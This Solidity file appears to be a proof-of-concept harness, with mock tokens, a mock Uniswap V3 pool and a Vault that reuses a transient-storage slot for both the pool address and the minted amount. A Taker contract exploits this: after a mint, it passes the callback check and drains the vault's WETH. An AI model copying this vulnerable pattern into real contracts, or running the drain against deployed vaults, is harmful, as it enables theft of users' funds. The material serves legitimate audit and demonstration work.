// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract Token is ERC20 {
    constructor(string memory n) ERC20(n, n) {}
    function mint(address to, uint256 a) external { _mint(to, a); }
}

interface IUniswapV3Pool {
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data)
        external returns (int256, int256);
}

interface ICallback { function uniswapV3SwapCallback(int256, int256, bytes calldata) external; }

// Mock pool: exact-input token0 (debt) for token1 (collateral) at 1:1, paid through the caller's callback.
contract MockPool is IUniswapV3Pool {
    Token public immutable token0;
    Token public immutable token1;
    constructor(Token t0, Token t1) { token0 = t0; token1 = t1; }
    function swap(address recipient, bool, int256 amountSpecified, uint160, bytes calldata data) external returns (int256, int256) {
        uint256 out = uint256(amountSpecified);
        token1.mint(recipient, out);
        uint256 before = token0.balanceOf(address(this));
        ICallback(msg.sender).uniswapV3SwapCallback(amountSpecified, -int256(out), data);
        require(token0.balanceOf(address(this)) >= before + uint256(amountSpecified), "IIA");
        return (amountSpecified, -int256(out));
    }
}

contract Vault {
    using SafeERC20 for IERC20;
    IERC20 public immutable weth;
    uint160 constant PRICE_LIMIT = 4295128740;
    mapping(address => bool) public isVaultPool;
    mapping(address => uint256) public leveragedOf;

    constructor(IERC20 d, address pool) { weth = d; isVaultPool[pool] = true; }

    // mint and uniswapV3SwapCallback are the instruction's snippet, verbatim.
    function mint(IUniswapV3Pool pool, uint256 debtIn) external returns (uint256 minted) {
        require(isVaultPool[address(pool)], "pool");
        weth.safeTransferFrom(msg.sender, address(this), debtIn);
        assembly { tstore(1, pool) }
        pool.swap(address(this), true, int256(debtIn), PRICE_LIMIT, abi.encode(msg.sender));
        assembly { minted := tload(1) }
    }

    function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes calldata data) external {
        address pool;
        assembly { pool := tload(1) }
        require(msg.sender == pool, "caller");
        uint256 minted = _mintLeveraged(abi.decode(data, (address)), uint256(-amount1));
        assembly { tstore(1, minted) }
        weth.safeTransfer(msg.sender, uint256(amount0));
    }

    function _mintLeveraged(address user, uint256 collateralIn) internal returns (uint256 minted) {
        minted = collateralIn; // 1 leveraged unit per collateral unit in this mock
        leveragedOf[user] += minted;
    }
}

// Runtime code is etched at an address whose numeric value the minted amount will equal.
contract Taker {
    function run(Vault vault, IUniswapV3Pool pool, IERC20 debt) external {
        uint256 debtIn = uint256(uint160(address(this)));
        debt.approve(address(vault), debtIn);
        uint256 minted = vault.mint(pool, debtIn);
        require(minted == uint256(uint160(address(this))), "minted != address");
        // Same transaction: slot 1 now holds `minted`, which equals this contract's address.
        vault.uniswapV3SwapCallback(int256(debt.balanceOf(address(vault))), 0, abi.encode(address(this)));
    }
}
